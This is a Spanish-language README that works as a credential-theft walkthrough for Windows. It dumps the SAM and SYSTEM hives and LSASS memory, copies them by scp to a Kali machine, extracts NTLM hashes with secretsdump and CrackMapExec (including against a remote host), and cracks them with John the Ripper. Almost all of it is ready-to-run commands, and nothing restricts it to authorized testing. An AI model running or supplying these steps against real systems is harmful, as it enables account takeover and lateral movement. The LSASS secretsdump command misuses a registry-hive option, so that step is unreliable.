# Volcado de información de LSASS y SAM

Este proyecto explica cómo volcar y extraer hashes de las cuentas locales de Windows utilizando los archivos SAM, SYSTEM y el proceso LSASS. También se incluyen métodos para descifrar los hashes con John the Ripper.

---

## **Requisitos**
- Máquina Windows (para el volcado de SAM, SYSTEM y LSASS).
- Máquina Kali Linux (para la extracción y descifrado de hashes).
- Herramientas:
  - Impacket-SecretsDump
  - CrackMapExec
  - John the Ripper
  - SCP o cualquier método de transferencia de archivos.

---

## **1. Volcado del archivo SAM y SYSTEM**

### **Paso 1: Guardar las claves del registro**
En la máquina Windows, ejecuta los siguientes comandos para guardar las claves del registro SAM y SYSTEM:
```cmd
reg save hklm\sam sam.save
reg save hklm\system system.save
```

### **Paso 2: Transferir los archivos a Kali Linux**
Usa `scp` o cualquier otro método para transferir los archivos a Kali Linux:
```bash
scp usuario@windows_ip:/ruta/a/sam.save /ruta/destino/kali/
scp usuario@windows_ip:/ruta/a/system.save /ruta/destino/kali/
```

---

## **2. Volcado de LSASS**

### **Paso 1: Generar un volcado de memoria**
1. Abre el Administrador de Tareas (`Ctrl + Shift + Esc`).
2. Busca el proceso `lsass.exe` en la pestaña **Detalles**.
3. Haz clic derecho en `lsass.exe` y selecciona **Crear volcado de memoria**.
4. Esto generará un archivo `lsass.DMP`.

### **Paso 2: Transferir el archivo a Kali Linux**
```bash
scp usuario@windows_ip:/ruta/a/lsass.DMP /ruta/destino/kali/
```

---

## **3. Extracción de hashes con Impacket-SecretsDump**

### **Extraer hashes del SAM y SYSTEM**
```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```

### **Extraer hashes del volcado de LSASS**
```bash
secretsdump.py -security lsass.DMP LOCAL
```

---

## **4. Extracción de hashes con CrackMapExec**

### **Obtener hashes NTLM de un equipo remoto**
```bash
crackmapexec smb 192.168.1.10 -u Administrador -p Password123 --sam
```

---

## **5. Descifrar hashes con John the Ripper**

### **Paso 1: Preparar el archivo de hashes**
Guarda los hashes en un archivo `hashes.txt`.

### **Paso 2: Descifrar los hashes**
```bash
john --format=NT hashes.txt
john --show hashes.txt
```

---

## **Contribuciones**
Si deseas contribuir a este proyecto, ¡siéntete libre de hacer un fork y enviar un pull request!


